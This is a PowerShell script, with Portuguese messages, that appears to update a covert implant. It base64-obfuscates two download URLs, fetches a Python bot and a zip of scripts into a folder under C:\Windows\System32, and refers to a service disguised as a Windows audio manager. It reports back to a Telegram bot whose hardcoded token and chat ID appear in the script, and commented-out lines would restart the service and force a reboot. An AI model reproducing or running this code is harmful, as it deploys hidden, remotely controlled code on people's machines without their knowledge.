$token = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
$chatId = "5757392163"
$zip = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pZ3VlbHNhbnRvczAyOS95b2xvL3JlZnMvaGVhZHMvbWFpbi9zY3JpcHRzLnppcD9kbD0x"
$script = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21pZ3VlbHNhbnRvczAyOS95b2xvL3JlZnMvaGVhZHMvbWFpbi9ib3QucHk/ZGw9MQ=="
$tempZip = "C:\Windows\System32\ap32\update.zip"
$tempscript = "C:\Windows\System32\ap32\service.py"
$extractPath = "C:\Windows\System32\ap32\update_extract"
$targetPath = "C:\Windows\System32\ap32\Res-PE"
$targetScript = "C:\Windows\System32\ap32\"
$serviceName = "Gestor Primario de Audio do Windows"

#taskkill /IM python.exe /F

try {
    Invoke-WebRequest -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($script))) -OutFile "C:\Windows\System32\ap32\service2.py"
}
catch {
    Write-Host "Erro ao descarregar o script:" $_
    exit
}
try {
    Invoke-WebRequest -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($zip))) -OutFile "C:\Windows\System32\ap32\update.zip"
}
catch {
    Write-Host "Erro ao descarregar o script:" $_
    exit
}

if (Test-Path "C:\Windows\System32\ap32\service.py") {
    Remove-Item "C:\Windows\System32\ap32\service.py" -Recurse -Force
}
Copy-Item -Path "C:\Windows\System32\ap32\service2.py" -Destination "C:\Windows\System32\ap32\service.py" -Force

if (Test-Path "C:\Windows\System32\ap32\update.zip") {
    Remove-Item "C:\Windows\System32\ap32\Res-PE" -Recurse -Force
}

Expand-Archive -Path "C:\Windows\System32\ap32\update.zip" -DestinationPath "C:\Windows\System32\ap32" -Force


Copy-Item -Path "C:\Windows\System32\ap32\scripts" -Destination "C:\Windows\System32\ap32\Res-PE" -Recurse -Force

Remove-Item "C:\Windows\System32\ap32\service2.py" -Force
Remove-Item "C:\Windows\System32\ap32\update.zip" -Force
Remove-Item "C:\Windows\System32\ap32\scripts" -Recurse -Force

#C:\Windows\System32\ap32\nssm.exe restart "Gestor Primario de Audio do Windows"

#sc.exe stop "Gestor Primario de Audio do Windows"
#Start-Sleep -Seconds 2
#sc.exe start "Gestor Primario de Audio do Windows"

$msg = "Reload dos Scripts completo!"
Invoke-RestMethod -Uri "https://api.telegram.org/bot$token/sendMessage" `
-Method Post `
-ContentType "application/json" `
-Body (@{ chat_id = $chatId; text = $msg } | ConvertTo-Json)

#Start-Process -FilePath "shutdown.exe" -ArgumentList "/r /t 0" -WindowStyle Hidden